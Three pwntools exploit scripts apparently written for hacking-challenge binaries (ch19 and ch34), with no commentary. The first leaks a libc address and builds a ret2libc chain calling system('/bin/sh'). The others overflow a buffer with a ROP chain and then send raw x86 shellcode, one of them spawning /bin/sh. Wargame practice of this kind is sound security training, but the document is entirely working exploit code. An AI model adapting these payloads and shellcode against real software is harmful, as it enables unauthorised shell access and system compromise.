from pwn import *

pr = process('/challenge/app-systeme/ch19/ch19')
payload1 = "ars\n5\n1\n1"
pr.sendline(payload1)
a = pr.recvuntil(', param')
addressOfFunc = a[-17:-7]
addressOfFunc = int(addressOfFunc,16)
addressOfLibc = addressOfFunc -320336
addressOfExit = addressOfLibc+114128
addressOfSystem = addressOfLibc + 167552
addressOfBinSh = addressOfLibc + 1348540
str1 = "AA"
payload2 = "ars\n-2147483648\n-1\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-14\na\na\n-15\na\na\n-14\na\na\n-12\na\na\n-16\na\na\n-12\na\na\n-16\na\na\n-6\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-12\na\na\n-16\na\na\n-15\na\na\n-14\na\na\n-11\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-15\na\na\n-15\na\na\n-15\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-11\na\na\n-16\na\na\n-16\na\na\n-15\na\na\n-15\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-12\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-15\na\na\n-16\na\na\n-2\na\na\nAA\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-16\na\na\n-6\na\na\n"
k = payload2.find(str1)
k = k+2
payload2 = payload2[:k] + p32(addressOfSystem) + p32(addressOfExit) + p32(addressOfBinSh) + payload2[k:]
# payload2 = payload2[:k] + p32(addressOfExit) +"AAAA"+"\x44\x44\x44\x44" + payload2[k:]
pr.sendline(payload2)


from pwn import *

pr = process('/challenge/app-systeme/ch34/ch34')
payload1 = 'A'*280+'\x10\xaa\x45\x00\x00\x00\x00\x00'*10+'\xd3\x16\x40\x00\x00\x00\x00\x00'+'\x00\xf0\x6b\x00\x00\x00\x00\x00'+'\xe7\x17\x40\x00\x00\x00\x00\x00'+'\x00\x01\x00\x00\x00\x00\x00\x00'+'\x05\x72\x43\x00\x00\x00\x00\x00'+'\x07\x00\x00\x00\x00\x00\x00\x00'+'\x25\xb5\x45\x00\x00\x00\x00\x00'+'\x9f\xbd\x41\x00\x00\x00\x00\x00'+'\xd3\x16\x40\x00\x00\x00\x00\x00'+'\x00\x00\x00\x00\x00\x00\x00\x00'+'\xe7\x17\x40\x00\x00\x00\x00\x00'+'\x00\xf0\x6b\x00\x00\x00\x00\x00'+'\x05\x72\x43\x00\x00\x00\x00\x00'+'\x00\x01\x00\x00\x00\x00\x00\x00'+'\x25\xb5\x45\x00\x00\x00\x00\x00'+'\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\xf0\x6b\x00\x00\x00\x00\x00' + '\x92\x1e\x4b\x00\x00\x00\x00\x00'
pr.sendline(payload1)
payload2 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
pr.sendline(payload2)

from pwn import *
pr = process('/challenge/app-systeme/ch34/ch34')
payload1 = 'A'*280+'\x10\xaa\x45\x00\x00\x00\x00\x00'*10+'\xd3\x16\x40\x00\x00\x00\x00\x00'+'\x00\xf0\x6b\x00\x00\x00\x00\x00'+'\xe7\x17\x40\x00\x00\x00\x00\x00'+'\x00\x01\x00\x00\x00\x00\x00\x00'+'\x05\x72\x43\x00\x00\x00\x00\x00'+'\x07\x00\x00\x00\x00\x00\x00\x00'+'\x25\xb5\x45\x00\x00\x00\x00\x00'+'\x9f\xbd\x41\x00\x00\x00\x00\x00'+'\xd3\x16\x40\x00\x00\x00\x00\x00'+'\x00\x00\x00\x00\x00\x00\x00\x00'+'\xe7\x17\x40\x00\x00\x00\x00\x00'+'\x00\xf0\x6b\x00\x00\x00\x00\x00'+'\x05\x72\x43\x00\x00\x00\x00\x00'+'\x00\x01\x00\x00\x00\x00\x00\x00'+'\x25\xb5\x45\x00\x00\x00\x00\x00'+'\x9f\xbd\x41\x00\x00\x00\x00\x00'+'\x00\xf0\x6b\x00\x00\x00\x00\x00'
pr.sendline(payload1)
payload2 = '\x31\xc0\x40\x89\xc3\xcd\x80'
pr.sendline(payload2)
